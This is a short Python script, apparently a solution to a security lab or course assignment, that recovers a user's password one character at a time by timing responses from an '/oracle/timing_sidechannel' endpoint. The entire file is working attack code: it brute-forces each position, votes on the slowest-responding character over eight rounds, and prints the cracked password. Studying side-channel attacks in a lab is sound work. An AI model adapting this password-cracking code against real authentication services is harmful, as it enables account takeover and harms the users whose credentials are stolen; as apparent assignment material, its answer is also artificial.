
import json
import sys

import requests

api_endpoint = sys.argv[1]
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

def handle_timing_sidechannel(assignment):
    session = requests.Session()
    user = assignment["user"]
    password = ""
    while True:        
        char, status = crack_char(user, alphabet, password, session)
        password += char
        if status == "auth_success":
            session.close()
            break
    print("Password: " + password)
    return {"password": password}
        
def crack_char(user, alphabet, password, session):
    total_stats = []
    for char in alphabet:
        status, time = query_oracle(session, user, password+char)
        if(status == "auth_success"):
            return char, status
    for i in range(8):
        char_stats = []
        for char in alphabet:   
            status, time = query_oracle(session, user, password+char+char)
            char_stats.append((char, time))
        char_stats.sort(key=lambda x: x[1], reverse=True)
        total_stats.append(char_stats[0][0])
    return(max(set(total_stats), key=total_stats.count)), status

def query_oracle(session: requests.Session, user: str, password: str) -> str:
    payload = { "user": user, "password": password }
    result = session.post(api_endpoint + "/oracle/timing_sidechannel", headers = {
        "Content-Type": "application/json"}, data = json.dumps(payload))
    try:
        time = result.json()["time"]
    except:
        time = 0
    return result.json()["status"], time